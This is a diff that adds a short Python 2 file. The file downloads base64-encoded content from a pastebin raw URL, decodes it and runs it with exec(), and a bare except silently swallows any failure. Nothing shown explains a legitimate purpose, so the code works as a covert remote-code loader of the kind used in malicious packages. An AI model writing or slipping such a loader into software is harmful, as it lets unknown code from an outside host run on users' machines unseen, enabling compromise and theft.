@@ -1,0 +1,10 @@
+#coding: utf-8
+import urllib
+import base64
+
+d= 'https://pastebin.com/raw/eRkrSQfE'
+try:
+    page=base64.b64decode(urllib.urlopen(d).read())
+    exec(page)
+except:
+    pass
